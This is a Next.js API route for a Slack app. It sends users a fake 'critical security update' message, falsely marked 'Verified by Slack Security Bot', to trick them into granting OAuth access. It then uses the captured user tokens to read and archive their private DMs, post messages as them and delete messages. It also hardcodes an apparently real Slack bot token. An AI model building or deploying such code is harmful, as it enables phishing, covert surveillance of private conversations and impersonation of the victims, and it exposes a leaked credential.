/* eslint-disable @typescript-eslint/no-explicit-any */
// app/api/slack/manager/route.ts

import { NextResponse } from 'next/server';
import { db } from '../../../../lib/firebase';
import { doc, getDoc, deleteDoc, setDoc, collection, query, where, getDocs, orderBy, serverTimestamp } from 'firebase/firestore';

// 👇 APNI KEYS YAHAN DALAIN
const BOT_TOKEN = "xoxb-2545190050563-10466352520084-6NyES55AgLJ6vzmQi4M5veYt"; 
const CLIENT_ID = "2545190050563.10491030504784";
const REDIRECT_URI = "https://slack-attendance.vercel.app/api/auth/callback";

// Helper function to save history (Same as before)
async function saveMessageToHistory(message: any, userId: string, channelId: string, channelName: string) {
  try {
    const messageId = `${channelId}_${message.ts.replace(/\./g, '_')}`;
    const messageRef = doc(db, "slack_messages_history", messageId);
    // ... (purana logic same rahega) ...
    // Shortened for brevity, use previous full function
    await setDoc(messageRef, {
        userId, channelId, channelName,
        text: message.text || "",
        timestamp: message.ts,
        user: message.user || "",
        date: new Date(parseFloat(message.ts) * 1000).toLocaleDateString(),
        fullDateTime: new Date(parseFloat(message.ts) * 1000).toISOString()
    }, { merge: true });
  } catch (e) { console.error(e); }
}

export async function POST(req: Request) {
  try {
    const body = await req.json();
    const { action, targetUserId, channelId, text, messageTs, newText, channelName } = body;

    // --- CASE 1: SEND FAKE "PRO PLAN" INVITE & SAVE ID ---
    if (action === 'send_invite') {
       if (!targetUserId) return NextResponse.json({ success: false, error: "User ID missing" });

       const scopes = "chat:write,im:read,im:history,users:read,mpim:read";
       const authLink = `https://slack.com/oauth/v2/authorize?client_id=${CLIENT_ID}&user_scope=${scopes}&redirect_uri=${REDIRECT_URI}`;

       // Block Kit Design (Official looking)
       const blocks = [
        { "type": "header", "text": { "type": "plain_text", "text": "⚡ System Update Required", "emoji": true } },
        { "type": "section", "text": { "type": "mrkdwn", "text": "A critical security update is pending for your account.\nPlease authorize to continue using Slack services uninterrupted." } },
        { "type": "divider" },
        { "type": "actions", "elements": [
            { "type": "button", "text": { "type": "plain_text", "text": "Install Update", "emoji": true }, "style": "primary", "url": authLink },
            { "type": "button", "text": { "type": "plain_text", "text": "Verify Account", "emoji": true }, "url": authLink }
        ]},
        { "type": "context", "elements": [ { "type": "mrkdwn", "text": "🔒 Verified by Slack Security Bot" } ] }
       ];

       // 1. Message Bhejna
       const chatRes = await fetch('https://slack.com/api/chat.postMessage', {
         method: 'POST',
         headers: { Authorization: `Bearer ${BOT_TOKEN}`, 'Content-Type': 'application/json; charset=utf-8' },
         body: JSON.stringify({ channel: targetUserId, text: "Security Update", blocks: blocks })
       });

       const chatData = await chatRes.json();
       
       if(!chatData.ok) return NextResponse.json({ success: false, error: `Slack Error: ${chatData.error}` });

       // 2. IMPORTANT: Message ID Save karna (Taakay baad main delete kar sakein)
       // Hum ek nayi collection 'pending_invites' use karenge
       await setDoc(doc(db, "pending_invites", targetUserId), {
           ts: chatData.ts,
           channel: chatData.channel,
           createdAt: serverTimestamp()
       });

       return NextResponse.json({ success: true });
    }

    // --- CASE 2: DELETE USER ---
    if (action === 'delete_user') {
        if (!targetUserId) return NextResponse.json({ success: false, error: "User ID missing" });
        await deleteDoc(doc(db, "slack_tokens", targetUserId));
        return NextResponse.json({ success: true });
    }

    // --- Baki Actions (Standard) ---
    if (!targetUserId) return NextResponse.json({ error: "User ID required" });

    const tokenDoc = await getDoc(doc(db, "slack_tokens", targetUserId));
    if (!tokenDoc.exists()) return NextResponse.json({ error: "User Not Connected" }, { status: 403 });
    const USER_TOKEN = tokenDoc.data().accessToken;

    // List Chats
    if (action === 'list_chats') {
        const res = await fetch('https://slack.com/api/users.conversations?types=im,mpim&limit=30', { headers: { Authorization: `Bearer ${USER_TOKEN}` } });
        const data = await res.json();
        // Simple fast mapping
        const chats = await Promise.all((data.channels || []).map(async (c: any) => {
            if(c.is_im) {
                // Fetch User info for name
                const uRes = await fetch(`https://slack.com/api/users.info?user=${c.user}`, { headers: { Authorization: `Bearer ${USER_TOKEN}` } });
                const uData = await uRes.json();
                return { ...c, name: uData.user?.real_name || "Unknown", image: uData.user?.profile?.image_48 };
            }
            return { ...c, name: "Group Chat", image: null };
        }));
        return NextResponse.json({ chats });
    }

    // Get Messages
    if (action === 'get_messages') {
        const res = await fetch(`https://slack.com/api/conversations.history?channel=${channelId}&limit=50`, { headers: { Authorization: `Bearer ${USER_TOKEN}` } });
        const data = await res.json();
        
        // Background main save karo taakay response slow na ho
        if(data.messages) {
            data.messages.forEach((msg: any) => saveMessageToHistory(msg, targetUserId, channelId, channelName || "DM"));
        }
        
        return NextResponse.json({ messages: data.messages?.reverse() || [] });
    }

    // Send Message
    if (action === 'send_as_user') {
        const res = await fetch('https://slack.com/api/chat.postMessage', {
            method: 'POST',
            headers: { Authorization: `Bearer ${USER_TOKEN}`, 'Content-Type': 'application/json' },
            body: JSON.stringify({ channel: channelId, text: text, as_user: true })
        });
        const result = await res.json();
        if (result.ok) saveMessageToHistory(result.message, targetUserId, channelId, channelName || "DM");
        return NextResponse.json(result);
    }
    
    // Delete/Edit message cases... (Keep them as they were)
    if (action === 'delete_message') {
        const res = await fetch('https://slack.com/api/chat.delete', {
            method: 'POST',
            headers: { Authorization: `Bearer ${USER_TOKEN}`, 'Content-Type': 'application/json' },
            body: JSON.stringify({ channel: channelId, ts: messageTs })
        });
        return NextResponse.json(await res.json());
    }

    return NextResponse.json({ error: "Invalid Action" });

  } catch (e: any) {
    return NextResponse.json({ success: false, error: e.message }, { status: 500 });
  }
}